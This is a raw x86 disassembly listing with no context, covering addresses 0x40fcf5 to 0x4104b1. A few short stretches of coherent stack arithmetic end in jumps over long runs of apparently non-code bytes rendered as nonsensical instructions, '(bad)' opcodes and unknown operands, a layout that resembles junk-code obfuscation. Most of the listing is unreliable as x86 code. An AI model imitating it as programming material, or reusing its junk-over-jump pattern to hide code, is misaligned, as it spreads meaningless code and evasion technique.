  40fcf5:	adc    edx,ecx
  40fcf7:	xor    BYTE PTR [ebp-0x5f],bh
  40fcfa:	rcr    DWORD PTR [edx+0x67],0xc1
  40fcfe:	mov    ebp,0x65bdad2b
  40fd03:	enter  0x6360,0xb5
  40fd07:	lahf   
  40fd08:	popf   
  40fd09:	hlt    
  40fd0a:	xchg   edx,eax
  40fd0b:	in     eax,0xa4
  40fd0d:	mov    ?,ecx
  40fd0f:	mov    eax,0x1552bb69
  40fd14:	out    dx,eax
  40fd15:	xchg   DWORD PTR [ecx+eiz*2],ebp
  40fd18:	adc    eax,0xb74e64bf
  40fd1d:	jle    0x40fd05
  40fd1f:	ss xchg ebp,eax
  40fd21:	push   edi
  40fd22:	mov    WORD PTR [ecx],?
  40fd24:	add    DWORD PTR [edx+0x3ce96e5a],ebx
  40fd2a:	push   0xffffffa4
  40fd2c:	data16 sti 
  40fd2e:	imul   ebp,DWORD PTR [ecx-0x9da2425],0x9df5c41c
  40fd38:	out    dx,eax
  40fd39:	bound  ebx,QWORD PTR [eax-0xdf1c406]
  40fd3f:	mov    cl,0x4
  40fd41:	hlt    
  40fd42:	(bad)  
  40fd43:	sub    eax,esi
  40fd45:	dec    esp
  40fd46:	inc    esi
  40fd47:	mov    ds:0x1bc0ffd8,eax
  40fd4c:	and    al,0x23
  40fd4e:	mov    ch,0x8e
  40fd50:	in     eax,dx
  40fd51:	and    DWORD PTR [ecx+0xb],0xcbcf2e20
  40fd58:	xchg   DWORD PTR es:[ebx-0x478a5291],ebp
  40fd5f:	adc    DWORD PTR [eax-0x45],edx
  40fd62:	lahf   
  40fd63:	fld    QWORD PTR [edi-0x64]
  40fd66:	pop    eax
  40fd67:	hlt    
  40fd68:	add    BYTE PTR [edi],0xbf
  40fd6b:	fmul   DWORD PTR [eax-0x1732ce2e]
  40fd71:	scas   al,BYTE PTR es:[edi]
  40fd72:	pop    es
  40fd73:	stos   BYTE PTR es:[edi],al
  40fd74:	popf   
  40fd75:	(bad)  
  40fd76:	ficomp DWORD PTR [ebx-0x2cc4042d]
  40fd7c:	cs popa 
  40fd7e:	sahf   
  40fd7f:	(bad)  
  40fd80:	div    BYTE PTR [edi+0x60f54423]
  40fd86:	adc    eax,0x22f20826
  40fd8b:	push   0xffffff8d
  40fd8d:	push   0x61
  40fd8f:	xor    eax,0xd5802ee6
  40fd94:	pusha  
  40fd95:	xchg   BYTE PTR [eax+0x551d79bf],dl
  40fd9b:	jge    0x40fd5f
  40fd9d:	or     ecx,DWORD PTR [edx+ecx*8]
  40fda0:	(bad)  [eax]
  40fda2:	std    
  40fda3:	and    bl,al
  40fda5:	mov    eax,0x43bbe681
  40fdaa:	(bad)  
  40fdab:	push   ds
  40fdac:	xchg   esi,eax
  40fdad:	cdq    
  40fdae:	(bad)  
  40fdaf:	sti    
  40fdb0:	add    ecx,ebp
  40fdb2:	push   ds
  40fdb3:	ins    BYTE PTR es:[edi],dx
  40fdb4:	rcr    BYTE PTR [eax-0x24],0x1b
  40fdb8:	icebp  
  40fdb9:	dec    ebp
  40fdba:	outs   dx,DWORD PTR ds:[esi]
  40fdbb:	std    
  40fdbc:	rol    DWORD PTR [ebx+0xa227ded],cl
  40fdc2:	pop    es
  40fdc3:	jmp    0xff47:0x8a73ca62
  40fdca:	mov    ecx,0x78678a2a
  40fdcf:	xor    al,0x13
  40fdd1:	pop    ecx
  40fdd2:	cmc    
  40fdd3:	or     ebp,DWORD PTR [esi-0xd71a056]
  40fdd9:	imul   ebx,DWORD PTR [esi],0xffffffef
  40fddc:	stos   DWORD PTR es:[edi],eax
  40fddd:	jl     0x40fdbc
  40fddf:	in     al,dx
  40fde0:	add    DWORD PTR [esi],ebx
  40fde2:	mov    esi,0xe8bfb6ac
  40fde7:	inc    ebp
  40fde8:	or     eax,ecx
  40fdea:	mov    ecx,DWORD PTR [ebp-0x20]
  40fded:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x42226c
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0x4a
  40fe8f:	push   0x2ca490a4
  40fe94:	mov    esi,0xbec4e3be
  40fe99:	mov    esi,0xc2504e28
  40fe9e:	mov    eax,DWORD PTR [eax+edx*8]
  40fea1:	add    dl,bh
  40fea3:	stos   BYTE PTR es:[edi],al
  40fea4:	sub    BYTE PTR [edx+0x14],cl
  40fea7:	int3   
  40fea8:	aad    0xac
  40feaa:	inc    ebx
  40feab:	and    BYTE PTR [esi+0x539a39c4],ch
  40feb1:	aas    
  40feb2:	sub    cl,BYTE PTR [esi]
  40feb4:	xor    cl,ch
  40feb6:	stos   BYTE PTR es:[edi],al
  40feb7:	out    dx,eax
  40feb8:	stc    
  40feb9:	lsl    edx,WORD PTR [esi+ebx*1-0x813098d]
  40fec1:	xchg   DWORD PTR [esi+0x54ffea8f],edi
  40fec7:	repz xlat BYTE PTR ds:[ebx]
  40fec9:	add    DWORD PTR [eax+0x6e],0xd87ad071
  40fed0:	(bad)  
  40fed1:	push   ds
  40fed2:	rcr    BYTE PTR [edx+0x2563ad3d],cl
  40fed8:	mov    dh,0x1
  40feda:	inc    ecx
  40fedb:	cmp    ah,BYTE PTR [ebp-0x18d642c8]
  40fee1:	ret    0x1b8
  40fee4:	dec    esp
  40fee5:	inc    ebp
  40fee6:	sahf   
  40fee7:	inc    ecx
  40fee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee9:	in     al,0x34
  40feeb:	push   edi
  40feec:	inc    ebx
  40feed:	jnp    0x40fefd
  40feef:	dec    edx
  40fef0:	mov    ch,0x25
  40fef2:	mov    cl,0x8
  40fef4:	sbb    al,0xbf
  40fef6:	cmp    eax,0x59f337b1
  40fefb:	push   ebp
  40fefc:	or     ah,BYTE PTR [eax+0x40fe20a8]
  40ff02:	dec    eax
  40ff03:	jp     0x40fef3
  40ff05:	mov    al,ds:0x60fe76d
  40ff0a:	int3   
  40ff0b:	jp     0x40fed3
  40ff0d:	and    al,0x7d
  40ff0f:	nop
  40ff10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff11:	dec    ebp
  40ff12:	mov    ebx,0x9afdf437
  40ff17:	lgs    eax,FWORD PTR [eax]
  40ff1a:	cdq    
  40ff1b:	mov    esp,0x147a5324
  40ff20:	push   ebx
  40ff21:	setle  BYTE PTR [eax+eiz*8-0x15bc5cbc]
  40ff29:	xor    al,0x83
  40ff2b:	int3   
  40ff2c:	xor    ebp,DWORD PTR [ebp-0x7b95d362]
  40ff32:	pop    eax
  40ff33:	dec    ebp
  40ff34:	pop    ecx
  40ff35:	les    esi,FWORD PTR [edi-0x7e]
  40ff38:	inc    ebx
  40ff39:	and    ebp,DWORD PTR [ecx+eiz*2]
  40ff3c:	pop    eax
  40ff3d:	imul   ecx,DWORD PTR [ebx+eax*4+0x4],0x2a
  40ff42:	push   0x42
  40ff44:	pusha  
  40ff45:	mov    ecx,0x44c69919
  40ff4a:	push   esp
  40ff4b:	ins    DWORD PTR es:[edi],dx
  40ff4c:	mov    al,ds:0x3021e0ee
  40ff51:	cs mov edx,0x5c94a9e1
  40ff57:	mov    ebp,0x776429b7
  40ff5c:	scas   al,BYTE PTR es:[edi]
  40ff5d:	push   0x3c94f0d5
  40ff62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff63:	dec    edi
  40ff64:	ficom  WORD PTR [esi-0x49]
  40ff67:	pop    ebp
  40ff68:	push   cs
  40ff69:	jle    0x40ff59
  40ff6b:	push   edx
  40ff6c:	mov    ebx,0xe5b3c84b
  40ff71:	rol    DWORD PTR [edi],0xca
  40ff74:	xlat   BYTE PTR ds:[ebx]
  40ff75:	push   0xffffff8a
  40ff77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff78:	(bad)  
  40ff79:	lods   al,BYTE PTR ds:[esi]
  40ff7a:	addr16 push 0x25160415
  40ff80:	dec    edx
  40ff81:	sbb    al,0xaf
  40ff83:	sub    edx,DWORD PTR [ebp+0x1f8b19cb]
  40ff89:	xchg   edi,eax
  40ff8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff8b:	add    eax,0x84ea007b
  40ff90:	and    al,0x24
  40ff92:	or     ecx,DWORD PTR [edx]
  40ff94:	retf   0xe8f0
  40ff97:	pop    ebp
  40ff98:	(bad)  
  40ff99:	mov    edi,0x5547b728
  40ff9e:	cwde   
  40ff9f:	loop   0x40ff85
  40ffa1:	call   0x73ca168a
  40ffa6:	xchg   esp,eax
  40ffa7:	and    DWORD PTR [ebx-0x1252b3ac],0x10
  40ffae:	ins    BYTE PTR es:[edi],dx
  40ffaf:	fdiv   DWORD PTR [esi+ebx*1]
  40ffb2:	cmp    al,0xaf
  40ffb4:	sub    eax,0xfe292f1d
  40ffb9:	mov    ds:0x968ef36c,al
  40ffbe:	or     BYTE PTR [esi],ch
  40ffc0:	jbe    0x410026
  40ffc2:	sub    al,0x83
  40ffc4:	mov    ebp,0xb3908cc5
  40ffc9:	test   ecx,esp
  40ffcb:	ins    BYTE PTR es:[edi],dx
  40ffcc:	jl     0x40ff69
  40ffce:	sahf   
  40ffcf:	mov    ebp,0xe0fb3064
  40ffd4:	test   eax,0xb48b2caf
  40ffd9:	(bad)  [ecx+esi*1-0x67f234a7]
  40ffe0:	aam    0xef
  40ffe2:	dec    ecx
  40ffe3:	pop    esp
  40ffe4:	outs   dx,BYTE PTR ds:[esi]
  40ffe5:	pop    esp
  40ffe6:	dec    edi
  40ffe7:	jl     0x40ffac
  40ffe9:	test   esp,ebx
  40ffeb:	dec    ecx
  40ffec:	leave  
  40ffed:	xor    DWORD PTR [edx],ebp
  40ffef:	mov    DWORD PTR [eax+eax*1-0x44],esp
  40fff3:	xlat   BYTE PTR ds:[ebx]
  40fff4:	push   cs
  40fff5:	sbb    esp,esp
  40fff7:	je     0x40ff90
  40fff9:	sub    DWORD PTR [eax+ebx*1-0x2e],ecx
  40fffd:	cmp    DWORD PTR [ecx-0x5],0x1f717405
  410004:	pop    esp
  410005:	and    al,0xff
  410007:	ss inc ebp
  410009:	fst    QWORD PTR [ecx]
  41000b:	into   
  41000c:	pop    eax
  41000d:	aas    
  41000e:	outs   dx,DWORD PTR ds:[esi]
  41000f:	int3   
  410010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410011:	mov    eax,0x7de0a20b
  410016:	dec    ebx
  410017:	and    edi,DWORD PTR [edx-0x27969d5]
  41001d:	push   eax
  41001e:	inc    esi
  41001f:	cwde   
  410020:	mov    esp,0xd9cbac0b
  410025:	dec    ecx
  410026:	and    eax,0x9c730a95
  41002b:	das    
  41002c:	inc    ebx
  41002d:	push   es
  41002e:	loop   0x40ffd5
  410030:	mov    ebx,0xe1e5c2a5
  410035:	push   ds
  410036:	ja     0x410064
  410038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410039:	ret    0xb508
  41003c:	dec    edx
  41003d:	sbb    ch,BYTE PTR [esi+ebx*8+0x48]
  410041:	popf   
  410042:	(bad)
  410045:	inc    esi
  410046:	jp     0x40ffe0
  410048:	aam    0xaa
  41004a:	inc    esi
  41004b:	add    ebx,DWORD PTR [ebp+0x55]
  41004e:	(bad)  
  41004f:	ror    BYTE PTR [edx],cl
  410051:	call   0xfeca3563
  410056:	out    dx,eax
  410057:	jnp    0x410005
  410059:	(bad)  [ebx]
  41005b:	aam    0x6
  41005d:	pop    edx
  41005e:	mov    dl,0x31
  410060:	stos   BYTE PTR es:[edi],al
  410061:	aad    0x9a
  410063:	mov    ecx,0x854f320b
  410068:	sti    
  410069:	sub    ax,0x2eed
  41006d:	xchg   ebx,eax
  41006e:	jae    0x41004f
  410070:	mov    ds:0xa8bc6f7e,eax
  410075:	xchg   esi,eax
  410076:	cmp    bl,BYTE PTR [ebx]
  410078:	mov    cl,0x2d
  41007a:	jmp    0xed46201d
  41007f:	mov    al,al
  410081:	mov    ss,WORD PTR [ecx]
  410083:	jle    0x410090
  410085:	push   cs
  410086:	xor    BYTE PTR [edx-0x35f86885],dl
  41008c:	pop    ebp
  41008d:	jmp    0x51d9df30
  410092:	mov    edx,DWORD PTR [edi+0x52]
  410095:	pop    edx
  410096:	shr    DWORD PTR [ebx],1
  410098:	jne    0x4100a4
  41009a:	cs jmp 0x410082
  41009d:	iret   
  41009e:	gs push ds
  4100a0:	lods   eax,DWORD PTR ds:[esi]
  4100a1:	dec    ebp
  4100a2:	add    DWORD PTR es:[ebx],ecx
  4100a5:	mov    DWORD PTR [eax+0xf],esi
  4100a8:	sbb    al,0x2f
  4100aa:	jge    0x41004e
  4100ac:	add    ebp,DWORD PTR [edi+0x2f]
  4100af:	int3   
  4100b0:	pop    ecx
  4100b1:	stc    
  4100b2:	cwde   
  4100b3:	mov    al,ds:0x90f5164f
  4100b8:	dec    ebp
  4100b9:	pop    ebx
  4100ba:	mov    ds:0xafea860,eax
  4100bf:	jbe    0x4100d7
  4100c1:	push   ss
  4100c2:	xor    al,0x9e
  4100c4:	cmp    al,0xbf
  4100c6:	mov    dl,BYTE PTR [ebx]
  4100c8:	push   esp
  4100c9:	mov    ch,0x10
  4100cb:	add    ch,BYTE PTR [ebp-0x28707c8f]
  4100d1:	je     0x4100ee
  4100d3:	jge    0x410154
  4100d5:	sbb    ebx,esp
  4100d7:	mov    ebx,0x655023ee
  4100dc:	lds    esp,FWORD PTR [esi-0x23a03269]
  4100e2:	test   DWORD PTR [eax],esp
  4100e4:	mov    WORD PTR [edx+0x6ad53a63],?
  4100ea:	aaa    
  4100eb:	aaa    
  4100ec:	add    DWORD PTR [ecx+0x71],edx
  4100ef:	mov    bl,0x94
  4100f1:	das    
  4100f2:	popa   
  4100f3:	loope  0x4100c5
  4100f5:	pop    edx
  4100f6:	add    eax,0xacff1a97
  4100fb:	mov    al,0xa9
  4100fd:	xchg   esp,eax
  4100fe:	dec    edi
  4100ff:	push   edx
  410100:	pop    eax
  410101:	pop    ds
  410102:	in     al,0xa6
  410104:	rol    DWORD PTR [edi-0x65],0xfe
  410108:	loop   0x410095
  41010a:	jmp    0x5efc:0xdedcff62
  410111:	and    al,0x2b
  410113:	dec    eax
  410114:	xchg   ebp,eax
  410115:	mov    esp,0x7b597c81
  41011a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011b:	daa    
  41011c:	popf   
  41011d:	sbb    eax,0xcd392b2a
  410122:	rol    DWORD PTR cs:[eax-0x6c],0xae
  410127:	mov    ch,0xb
  410129:	sub    BYTE PTR [ecx+0x37],0x66
  41012d:	out    0xf2,al
  41012f:	lahf   
  410130:	lea    edx,[edi-0x49973988]
  410136:	mov    edx,0x9717acf8
  41013b:	xor    DWORD PTR [ebx-0x1c],edx
  41013e:	ficomp WORD PTR [ebx+0x1e]
  410141:	mov    edi,0x9d98ce5f
  410146:	jle    0x41013f
  410148:	lods   al,BYTE PTR ds:[esi]
  410149:	sub    esi,ebp
  41014b:	xchg   ecx,eax
  41014c:	push   ds
  41014d:	and    eax,0xfc5e1958
  410152:	call   0xf77c:0x47ee1040
  410159:	inc    ebp
  41015a:	fild   DWORD PTR [edi-0x2e]
  41015d:	or     al,0x4d
  41015f:	pop    edi
  410160:	mul    DWORD PTR [ecx]
  410162:	dec    ecx
  410163:	test   esi,ebp
  410165:	fst    QWORD PTR fs:[edi+0x4]
  410169:	jae    0x4100ed
  41016b:	push   ecx
  41016c:	inc    edi
  41016d:	je     0x410176
  41016f:	stos   DWORD PTR es:[edi],eax
  410170:	sub    al,BYTE PTR [edx+edx*8+0x4d]
  410174:	daa    
  410175:	aas    
  410176:	pop    eax
  410177:	jnp    0x4101e3
  410179:	push   ebx
  41017a:	sti    
  41017b:	pushf  
  41017c:	jnp    0x4101da
  41017e:	xchg   edi,eax
  41017f:	dec    edi
  410180:	pop    edx
  410181:	loope  0x410106
  410183:	mov    dl,dl
  410185:	sbb    ebx,DWORD PTR [edi+0x15ccaa41]
  41018b:	popf   
  41018c:	sub    DWORD PTR [edi],0x78b7466e
  410192:	xchg   al,dl
  410194:	cmp    BYTE PTR [eax-0x1b456320],0xf
  41019b:	mov    cl,0x0
  41019d:	jp     0x4101de
  41019f:	int3   
  4101a0:	add    bh,BYTE PTR [edi-0x6c5331c1]
  4101a6:	push   ebp
  4101a7:	inc    edi
  4101a8:	add    eax,0x38613e9d
  4101ad:	mov    bl,0xbf
  4101af:	inc    ebx
  4101b0:	sub    eax,0xcfdb0a9c
  4101b5:	dec    ebp
  4101b6:	pop    eax
  4101b7:	inc    edi
  4101b8:	sbb    eax,0x8ef9af55
  4101bd:	cmp    BYTE PTR [edi-0x38],bh
  4101c0:	adc    al,0xf
  4101c2:	mov    ah,0x3d
  4101c4:	loopne 0x410163
  4101c6:	push   edi
  4101c7:	cdq    
  4101c8:	and    bl,BYTE PTR [ecx]
  4101ca:	xchg   esp,eax
  4101cb:	adc    eax,0xa5d928ae
  4101d0:	inc    eax
  4101d1:	xchg   esi,eax
  4101d2:	xlat   BYTE PTR ds:[ebx]
  4101d3:	or     eax,0x47285a03
  4101d8:	pushf  
  4101d9:	popa   
  4101da:	push   cs
  4101db:	das    
  4101dc:	pop    eax
  4101dd:	leave  
  4101de:	mov    eax,0x927b7009
  4101e3:	push   ebx
  4101e4:	loop   0x41019f
  4101e6:	rcl    edi,1
  4101e8:	inc    eax
  4101e9:	xchg   ebp,eax
  4101ea:	and    BYTE PTR [ebx+0x6a250c92],0xe
  4101f1:	inc    edi
  4101f2:	push   ss
  4101f3:	adc    al,0xdb
  4101f5:	fidiv  DWORD PTR [edx-0x3d217f1f]
  4101fb:	adc    eax,edi
  4101fd:	addr16 xchg edi,eax
  4101ff:	xchg   edx,eax
  410200:	mov    edx,0x9e6256aa
  410205:	gs dec esp
  410207:	add    eax,0x81dc688b
  41020c:	scas   eax,DWORD PTR es:[edi]
  41020d:	scas   al,BYTE PTR es:[edi]
  41020e:	push   esi
  41020f:	inc    ebx
  410210:	fnop   
  410212:	pop    ss
  410213:	push   es
  410214:	test   BYTE PTR [esi-0x1d],ch
  410217:	ins    BYTE PTR es:[edi],dx
  410218:	retf   0xaf93
  41021b:	popf   
  41021c:	fadd   st(3),st
  41021e:	adc    esp,esi
  410220:	in     eax,dx
  410221:	hlt    
  410222:	outs   dx,DWORD PTR ds:[esi]
  410223:	push   edi
  410224:	mov    al,ds:0x4b84c39e
  410229:	aam    0xf0
  41022b:	xor    DWORD PTR [ebx+0x7132a505],esp
  410231:	mov    eax,DWORD PTR [ebp-0x28]
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	mov    eax,0xc9cfbf37
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	ins    DWORD PTR es:[edi],dx
  41027c:	(bad)  
  41027d:	ret    0x6bc3
  410280:	and    al,0xa2
  410282:	xchg   ecx,eax
  410283:	mov    ds:0xab275410,eax
  410288:	sahf   
  410289:	fimul  DWORD PTR [edx+0x7ffdb942]
  41028f:	sbb    dh,dl
  410291:	and    BYTE PTR [ebx-0x5b],dl
  410294:	stc    
  410295:	loop   0x410271
  410297:	inc    sp
  410299:	aaa    
  41029a:	push   0x6b
  41029c:	adc    al,0x36
  41029e:	data16 mov al,ds:0xb76f2c5
  4102a4:	ret    0x830e
  4102a7:	add    DWORD PTR [ebp-0x48f949eb],edi
  4102ad:	out    dx,eax
  4102ae:	icebp  
  4102af:	sub    BYTE PTR [eax+0x1ea76546],dl
  4102b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b6:	sbb    DWORD PTR [ecx],edi
  4102b8:	(bad)  
  4102b9:	xchg   esp,eax
  4102ba:	outs   dx,DWORD PTR ds:[esi]
  4102bb:	arpl   WORD PTR [ebx+ecx*8-0x56],ax
  4102bf:	cmp    ch,BYTE PTR [eax-0x6b34a70d]
  4102c5:	dec    ebx
  4102c6:	xchg   edx,eax
  4102c7:	xchg   esi,eax
  4102c8:	mov    esi,0x4163a09b
  4102cd:	(bad)  
  4102ce:	jae    0x410320
  4102d0:	cmp    al,0x81
  4102d2:	xchg   ecx,eax
  4102d3:	sub    al,0xb5
  4102d5:	jbe    0x4102f1
  4102d7:	mov    eax,0x33f2d675
  4102dc:	sbb    BYTE PTR [esi+0x7],0xb
  4102e0:	std    
  4102e1:	cmp    cl,BYTE PTR [eax+0x4a]
  4102e4:	and    BYTE PTR [ebx-0x44d79508],ah
  4102ea:	jl     0x4102ed
  4102ec:	and    eax,0xfcfb9da0
  4102f1:	into   
  4102f2:	xor    eax,DWORD PTR [ebp+0x5d4b43de]
  4102f8:	popa   
  4102f9:	jne    0x4102ea
  4102fb:	test   eax,0x61dc71ce
  410300:	inc    esp
  410301:	mov    ebx,0x428ee5ec
  410306:	in     eax,0x75
  410308:	fidiv  DWORD PTR [eax]
  41030a:	or     eax,0xf1f906cf
  41030f:	jbe    0x41033a
  410311:	in     eax,0xd
  410313:	dec    ebp
  410314:	push   0x14981191
  410319:	add    DWORD PTR [edi+0x766d6575],0xf2116c19
  410323:	ret    
  410324:	inc    esi
  410325:	fiadd  WORD PTR cs:[ecx+eiz*8-0x4531747e]
  41032d:	dec    esp
  41032e:	addr16 arpl cx,di
  410331:	sbb    ebx,edx
  410333:	aad    0x92
  410335:	dec    ebx
  410336:	or     bh,BYTE PTR [edx-0x29bdb943]
  41033c:	fdivr  QWORD PTR [edx-0x4a6732f2]
  410342:	mov    esi,esp
  410344:	or     ebx,DWORD PTR [ecx]
  410346:	aas    
  410347:	add    ecx,esp
  410349:	in     al,0xc3
  41034b:	fist   DWORD PTR [edi-0x62]
  41034e:	mov    bh,0x83
  410350:	push   0x141bc68e
  410355:	xchg   edi,eax
  410356:	mov    DWORD PTR [ebp-0x39f0fdc0],ebx
  41035c:	push   ebx
  41035d:	outs   dx,DWORD PTR ds:[esi]
  41035e:	and    ebx,DWORD PTR [ecx]
  410360:	sbb    al,0xc0
  410362:	sti    
  410363:	stos   BYTE PTR es:[edi],al
  410364:	and    DWORD PTR [ebx+0xc14c8a8],ebx
  41036a:	pop    ecx
  41036b:	mov    dl,0x8d
  41036d:	gs int 0x6c
  410370:	(bad)  
  410371:	imul   dl
  410373:	sub    BYTE PTR [eax+0x15d8d89d],ch
  410379:	sub    edi,DWORD PTR [edx]
  41037b:	adc    cl,BYTE PTR [ebp-0x608e6e50]
  410381:	xchg   ebp,eax
  410382:	jbe    0x4103ba
  410384:	dec    edi
  410385:	data16 aad 0x6e
  410388:	add    ebp,DWORD PTR [eax+0x35]
  41038b:	cmc    
  41038c:	fdiv   DWORD PTR [ecx]
  41038e:	(bad)
  410391:	(bad)  
  410393:	push   eax
  410394:	test   BYTE PTR [edx-0x6f],al
  410397:	xor    BYTE PTR [esi],0x7b
  41039a:	outs   dx,DWORD PTR ds:[esi]
  41039b:	and    BYTE PTR [ebx-0x7d7fa91f],0x9b
  4103a2:	lock lods al,BYTE PTR ds:[esi]
  4103a4:	dec    edx
  4103a5:	pop    ebx
  4103a6:	rcr    BYTE PTR fs:[eax-0x55],1
  4103aa:	retf   
  4103ab:	add    al,0x19
  4103ad:	daa    
  4103ae:	rcr    BYTE PTR [edx],1
  4103b0:	popf   
  4103b1:	repz mov ah,BYTE PTR [esi]
  4103b4:	push   es
  4103b5:	and    cl,BYTE PTR [edi+0x17ff0da6]
  4103bb:	bound  ebp,QWORD PTR [eax+0x2c]
  4103be:	cdq    
  4103bf:	sbb    eax,DWORD PTR [ecx]
  4103c1:	nop
  4103c2:	cmp    DWORD PTR [edx-0x1b9a4dfa],ebp
  4103c8:	sbb    eax,0x67c322ac
  4103cd:	retf   
  4103ce:	mov    bl,0x53
  4103d0:	outs   dx,DWORD PTR ds:[esi]
  4103d1:	dec    ebx
  4103d2:	xor    BYTE PTR [ebx+edi*2-0x58],cl
  4103d6:	icebp  
  4103d7:	adc    bl,BYTE PTR es:[eax+0x35beca93]
  4103de:	sub    al,0x81
  4103e0:	out    dx,al
  4103e1:	sbb    al,0x30
  4103e3:	cwde   
  4103e4:	and    esi,DWORD PTR [ecx-0x403e3539]
  4103ea:	mov    DWORD PTR [edi],0x7f1c47fa
  4103f0:	call   0x2ac0:0x42ae3f81
  4103f7:	mov    eax,0xf1fad690
  4103fc:	push   0x3c9d8899
  410401:	(bad)  
  410402:	jne    0x410447
  410404:	lods   al,BYTE PTR ds:[esi]
  410405:	lock call 0xd155:0x3e933992
  41040d:	pop    edx
  41040e:	or     ch,BYTE PTR [ecx+0xb]
  410411:	mov    edx,0xd6d046eb
  410416:	jl     0x41044b
  410418:	hlt    
  410419:	bnd jnp 0x4103f5
  41041c:	out    dx,eax
  41041d:	test   eax,0xf5ddc86
  410422:	dec    eax
  410423:	call   0x76affebf
  410428:	gs pop esp
  41042a:	mov    eax,ds:0xbd459a09
  41042f:	jno    0x410411
  410431:	push   edi
  410432:	add    eax,0xbe572190
  410437:	jecxz  0x410438
  410439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043a:	sahf   
  41043b:	or     DWORD PTR [ecx+edx*8+0x29],edi
  41043f:	pop    esp
  410440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410441:	xor    BYTE PTR [edi-0x1121ed6],ah
  410447:	push   ds
  410448:	xlat   BYTE PTR ds:[ebx]
  410449:	xor    dl,al
  41044b:	push   esp
  41044c:	xchg   DWORD PTR [eax+0x44c05039],ebx
  410452:	into   
  410453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410454:	not    BYTE PTR [eax]
  410456:	adc    ebp,ebp
  410458:	sbb    eax,0x7ffcab01
  41045d:	push   es
  41045e:	pop    es
  41045f:	lds    ebx,FWORD PTR [ebx]
  410461:	push   esi
  410462:	mov    edi,0x96c41688
  410467:	adc    dh,BYTE PTR [eax+edx*8+0x72517d55]
  41046e:	aaa    
  41046f:	ret    
  410470:	push   edi
  410471:	adc    BYTE PTR [ebp-0x6a731546],bh
  410477:	pop    ebp
  410478:	jg     0x41046b
  41047a:	mov    BYTE PTR [edi+ebx*1-0x36],dl
  41047e:	add    ebp,DWORD PTR [esi]
  410480:	test   al,0xc5
  410482:	gs push es
  410484:	and    eax,0x37dfc966
  410489:	shl    BYTE PTR [ebx-0x1b],cl
  41048c:	int    0x43
  41048e:	ins    DWORD PTR es:[edi],dx
  41048f:	jle    0x4104a4
  410491:	retf   
  410492:	sbb    eax,0x86ea7635
  410497:	jecxz  0x410473
  410499:	xor    DWORD PTR [ebx],ecx
  41049b:	rcr    BYTE PTR [eax],1
  41049d:	push   esp
  41049e:	repz pop ebx
  4104a0:	mov    dl,0xd1
  4104a2:	or     esi,eax
  4104a4:	jg     0x41051a
  4104a6:	cmp    eax,0x6ff7351d
  4104ab:	xchg   ebp,eax
  4104ac:	clc    
  4104ad:	pop    edx
  4104ae:	sbb    dl,BYTE PTR [ebp-0x38]
  4104b1:	retf   
